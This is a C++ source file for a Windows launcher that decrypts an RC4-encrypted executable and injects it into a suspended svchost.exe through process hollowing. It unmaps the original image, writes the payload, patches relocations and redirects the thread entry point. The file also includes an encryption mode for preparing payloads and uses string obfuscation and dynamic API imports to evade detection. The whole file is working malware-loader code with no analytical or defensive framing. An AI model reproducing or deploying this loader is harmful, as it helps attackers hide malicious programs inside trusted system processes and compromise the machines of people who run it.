#include "ntdll.h"
#include <stdarg.h>
#include <iostream>
#include <filesystem>
#include <string>
#include <memory>
#include <fstream>
#include <assert.h>
#include <functional>
#include "xorstr.hpp"
#include "rc4.h"
#include "importer.h"

namespace fs = std::filesystem;
std::string puppet_path = xorstr_("C:\\Windows\\System32\\svchost.exe");
unsigned char rc4_key[16] = {
  0x53, 0xFF, 0x71, 0x18, 0xE8, 0x77, 0x84, 0x02, 0x00, 0x8B, 0x4C, 0x24, 0x74, 0x8B, 0xC7, 0x5F
};

using PEB_ptr = std::unique_ptr<PEB>;


enum LOG_LEVEL
{
  LOG_LEVEL_INFO = 0,
  LOG_LEVEL_ERROR
};

static void println(LOG_LEVEL level, const char* fmt, va_list ap)
{
  std::string logtext;
  logtext.resize( std::vsnprintf(NULL, 0, fmt, ap) + 1);
  std::vsnprintf(logtext.data(), logtext.size(), fmt, ap);
  std::cout <<(level == LOG_LEVEL_INFO ? "[+] " : "[-] ") << logtext << std::endl;
}

static inline void iprintln(const char* fmt, ...)
{
  va_list ap;
  va_start(ap, fmt);
  println(LOG_LEVEL_INFO, fmt, ap);
  va_end(ap);
}

static inline void eprintln(const char* fmt, ...)
{
  va_list ap;
  va_start(ap, fmt);
  println(LOG_LEVEL_ERROR, fmt, ap);
  va_end(ap);
}

static PEB_ptr read_peb(HANDLE process)
{
  quick_import_function(L"ntdll.dll", NtQueryInformationProcess);
  quick_import_function(L"kernel32.dll", ReadProcessMemory);
  PROCESS_BASIC_INFORMATION basicInfo = { 0 };
  DWORD dwReturnLength = 0;
  NTSTATUS status = 0;

  NtQueryInformationProcess(process, ProcessBasicInformation, &basicInfo, sizeof(basicInfo), &dwReturnLength);
  if (!NT_SUCCESS(status) || dwReturnLength != sizeof(basicInfo) || basicInfo.PebBaseAddress == 0)
  {
    return nullptr;
  }

  PEB_ptr peb = std::make_unique<PEB>();
  if (!ReadProcessMemory(process, basicInfo.PebBaseAddress, peb.get(), sizeof(PEB), NULL))
  {
    return nullptr;
  }
  return peb;
}

static std::vector<uint8_t> read_binaray_file(const std::string& path)
{
  std::vector<uint8_t> data;
  std::ifstream ifs(path, std::ios::binary);
  if(!ifs.is_open())
    return {};

  ifs.seekg(0, std::ios::end);
  data.resize( ifs.tellg());
  ifs.seekg(0, std::ios::beg);

  ifs.read(reinterpret_cast<char*> (data.data()), (std::streamsize)data.size());
  return data;
}

static bool write_binaray_file(const std::string& path, const std::vector<uint8_t>& data)
{
  std::ofstream ofs(path, std::ios::binary | std::ios::out | std::ios::trunc);
  if (!ofs.is_open())
    return false;

  ofs.write(reinterpret_cast<const char*>(data.data()), (std::streamsize)data.size());
  return true;
}

static bool decryption_filedata(std::vector<uint8_t>& data)
{
  rc4_state rc4{};
  rc4_setup(&rc4, rc4_key, sizeof(rc4_key));
  rc4_crypt(&rc4, data.data(), data.size());
  return true;
}
static bool encryption_filedata(std::vector<uint8_t>& data)
{
  rc4_state rc4{};
  rc4_setup(&rc4, rc4_key, sizeof(rc4_key));
  rc4_crypt(&rc4, data.data(), data.size());
  return true;
}

class resource_guard
{
public:
  resource_guard(std::function<void()> free_func):free_func_(free_func){};
  ~resource_guard(){ free_func_(); };

  void free()
  {
    free_func_();
  }
private:
  std::function<void()> free_func_;
};

static void print_useway()
{
  eprintln(xorstr_("use: launcher.exe [source path]"));
  eprintln(xorstr_("use: launcher.exe enc [input_file] [output_file]"));
}

static std::string get_defualt_encrypt_file_name(const fs::path& inputpath) 
{
  fs::path parent_path = inputpath.parent_path();
  std::string extension = inputpath.extension().string();
  fs::path newname = inputpath.stem().string()+ xorstr_("_enc") + extension;
  fs::path newpath = parent_path / newname;

  return newpath.string();
}

static bool IsRunAsAdmin() {
  BOOL isAdmin = FALSE;
  PSID adminGroup = NULL;

  // SID for the administrators group
  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
  if (AllocateAndInitializeSid(
    &NtAuthority,
    2,
    SECURITY_BUILTIN_DOMAIN_RID,
    DOMAIN_ALIAS_RID_ADMINS,
    0, 0, 0, 0, 0, 0,
    &adminGroup))
  {
    // Check if the token of the current process contains admin group SID
    CheckTokenMembership(NULL, adminGroup, &isAdmin);
    FreeSid(adminGroup);
  }

  return isAdmin == TRUE;
}

int main(int argc, char* argv[])
{
  quick_import_function(L"ntdll.dll", NtUnmapViewOfSection);
  quick_import_function(L"kernel32.dll", CreateProcessA);
  quick_import_function(L"kernel32.dll", VirtualAllocEx);
  quick_import_function(L"kernel32.dll", WriteProcessMemory);
  quick_import_function(L"kernel32.dll", ReadProcessMemory);
  quick_import_function(L"kernel32.dll", ResumeThread);
  quick_import_function(L"kernel32.dll", VirtualProtectEx);
  quick_import_function(L"kernel32.dll", GetThreadContext);
  quick_import_function(L"kernel32.dll", SetThreadContext);
  NTSTATUS status =  0;
  bool success = false;

  if (argc < 2)
  {
    eprintln(xorstr_("Invalid parameters"));
    print_useway();
    return 1;
  }

  if (stricmp(argv[1], "enc") == 0)
  {
    if (argc < 3)
    {
      eprintln(xorstr_("Invalid parameters"));
      print_useway();
      return 1;
    }

    char* inputfile = argv[2];
    if (!fs::exists(inputfile))
    {
      eprintln(xorstr_("intput file is not exist!"));
      return 1;
    }


    std::string outputfile = argc == 4? argv[3] : get_defualt_encrypt_file_name(inputfile);
    std::vector<uint8_t> source_data = (read_binaray_file)(inputfile);
    if (!encryption_filedata(source_data))
    {
      eprintln(xorstr_("Failed to encrypt data!"));
      return 1;
    }
    if (!write_binaray_file(outputfile, source_data))
    {
      eprintln(xorstr_("Failed to write file!"));
      return 1;
    }
    iprintln("success");
    return 0;
  }
  if (!IsRunAsAdmin())
  {
    eprintln(xorstr_("Must be run as administrator"));
    return 1;
  }

  std::string source_path(argv[1]);

  if (!fs::exists(puppet_path))
  {
    eprintln(xorstr_("svchost.exe is not exist!"));
    return 1;
  }
  if (!fs::exists(source_path))
  {
    eprintln(xorstr_("source path is not exist!"));
    return 1;
  }

  // read encrypted File
  std::vector<uint8_t> source_data = (read_binaray_file)(source_path);
  if (source_data.empty())
  {
    eprintln(xorstr_("The source program does not exist or has no data! error: %08X"), GetLastError());
    return 1;
  }

  // Decryption data
  if (!decryption_filedata(source_data))
  {
    eprintln(xorstr_("Failed to decrypt data!"));
    return 1;
  }

  STARTUPINFOA si {};
  si.cb = sizeof(STARTUPINFOA);
  PROCESS_INFORMATION pi{};
  if (!(CreateProcessA)(NULL, puppet_path.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
  {
    eprintln(xorstr_("Failed to create svchost process! error: %08X"), GetLastError());
    return 1;
  }
  DWORD pid = GetProcessId(pi.hProcess);
  iprintln(xorstr_("process id: %d(%08x)"), pid, pid);
  assert(pi.hProcess);
  assert(pi.hThread);

  // 资源释放
  resource_guard res_guard([&]() {
    if (!success && pi.hProcess)
      TerminateProcess(pi.hProcess, 0);

    if(pi.hProcess)
      CloseHandle(pi.hProcess);
    if (pi.hThread)
      CloseHandle(pi.hThread);
  });

  // 读取PEB
  PEB_ptr peb = (read_peb)(pi.hProcess);
  if (peb == nullptr)
  {
    eprintln(xorstr_("Failed to read the process PEB! error: %08X"), GetLastError());
    return 1;
  }

  // NtUnMapSection
  status = (NtUnmapViewOfSection)(pi.hProcess, peb->ImageBaseAddress);
  if (!NT_SUCCESS(status) )
  {
    eprintln(xorstr_("Failed to UnmapViewOfSection! status: %08X"), status);
    return 1;
  }

  IMAGE_DOS_HEADER* doshdr = (IMAGE_DOS_HEADER*)source_data.data();
  IMAGE_NT_HEADERS* nthdr = (IMAGE_NT_HEADERS*)((char*)doshdr + doshdr->e_lfanew);
  IMAGE_SECTION_HEADER*  section = IMAGE_FIRST_SECTION(nthdr);
  int section_count = nthdr->FileHeader.NumberOfSections;

  // VirtualAllocEx
  char* remoteimage =  (char*)VirtualAllocEx(pi.hProcess, peb->ImageBaseAddress, nthdr->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (remoteimage == NULL)
  {
    eprintln(xorstr_("Failed to VirtualAllocEx! error: %08X"), GetLastError());
    return 1;
  }

  intptr_t dwDelta = (intptr_t)peb->ImageBaseAddress - nthdr->OptionalHeader.ImageBase;
  nthdr->OptionalHeader.ImageBase = (ULONGLONG)remoteimage;

  // Copy PE Heads
  if (!WriteProcessMemory(pi.hProcess, remoteimage, doshdr, nthdr->OptionalHeader.SizeOfHeaders, NULL))
  {
    eprintln(xorstr_("Failed to write to headers! error: %08X"), GetLastError());
    return 1;
  }
  DWORD old_protected = 0;
  (VirtualProtectEx)(pi.hProcess, remoteimage, nthdr->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_protected);

  // Copy Section
  for (int i = 0; i < section_count; ++i)
  {
    if (!WriteProcessMemory(pi.hProcess, remoteimage + section[i].VirtualAddress, source_data.data() + section[i].PointerToRawData, section[i].SizeOfRawData, NULL))
    {
      eprintln(xorstr_("Failed write to section index: %d! error: %08X"), i, GetLastError());
      return 1;
    }
  }

  // Fix Reloc base
  if (dwDelta)
  {
    IMAGE_DATA_DIRECTORY* reloc = &nthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD reloc_fa = 0;
    for (int i = 0; i < section_count; ++i)
    {
      if (reloc->VirtualAddress >= section[i].VirtualAddress && reloc->VirtualAddress < section[i].VirtualAddress + section[i].Misc.VirtualSize)
      {
        reloc_fa = section[i].PointerToRawData;
        break;
      }
    }
    assert(reloc_fa != 0);

    DWORD offset = 0;
    while (offset < reloc->Size)
    {
      IMAGE_BASE_RELOCATION* base_rel = (IMAGE_BASE_RELOCATION*)(source_data.data() + reloc_fa + offset);

      WORD* rel_ptr = (WORD*)(base_rel+1);
      int rel_count = (base_rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
      for (int i = 0; i < rel_count ; i++)
      {
        int type = (rel_ptr[i]>>12);
        int block_off = (rel_ptr[i] & 0xfff);
        if (base_rel->VirtualAddress + block_off == 0x20D6E0)
        {
          int j =0;
        }

        if (type == IMAGE_REL_BASED_DIR64)
        {
          intptr_t rel_value;
          void* rel_address = remoteimage + base_rel->VirtualAddress + block_off;
          if (!ReadProcessMemory(pi.hProcess, rel_address, &rel_value, sizeof(rel_value), NULL))
          {
            eprintln(xorstr_("Failed read to reloc : %p! error: %08X"), rel_address, GetLastError());
            return 1;
          }
          rel_value += dwDelta;
          if (!WriteProcessMemory(pi.hProcess, rel_address, &rel_value, sizeof(rel_value), NULL))
          {
            eprintln(xorstr_("Failed write to reloc : %p! error: %08X"), rel_address, GetLastError());
            return 1;
          }
        }
        
      }

      offset += base_rel->SizeOfBlock;
    }
  }
  // reset section page protecte
  for (int i = 0; i < section_count; ++i)
  {

    DWORD proetct = 0;
    if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)
      proetct |= PAGE_READWRITE;

    if (section[i].Characteristics & IMAGE_SCN_MEM_READ)
      proetct |= PAGE_READONLY;

    if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
      proetct |= PAGE_EXECUTE_READ;

    (VirtualProtectEx)(pi.hProcess, remoteimage + section[i].VirtualAddress, nthdr->OptionalHeader.SizeOfHeaders, proetct, &old_protected);
  }

  // set thread rcx to entrypointer
  LONGLONG dwEntrypoint = (LONGLONG)peb->ImageBaseAddress + nthdr->OptionalHeader.AddressOfEntryPoint;
  CONTEXT pContext;
  pContext.ContextFlags = CONTEXT_INTEGER;
  (GetThreadContext)(pi.hThread, &pContext);

  pContext.Rcx = dwEntrypoint;
  (SetThreadContext)(pi.hThread, &pContext);

  // resume main thread
  if (!(ResumeThread)(pi.hThread))
  {
    eprintln(xorstr_("Error resuming thread! error: %08X"), GetLastError());
    return 1;
  }

  iprintln("success");
  success = true;
  getchar();
  return 0;
}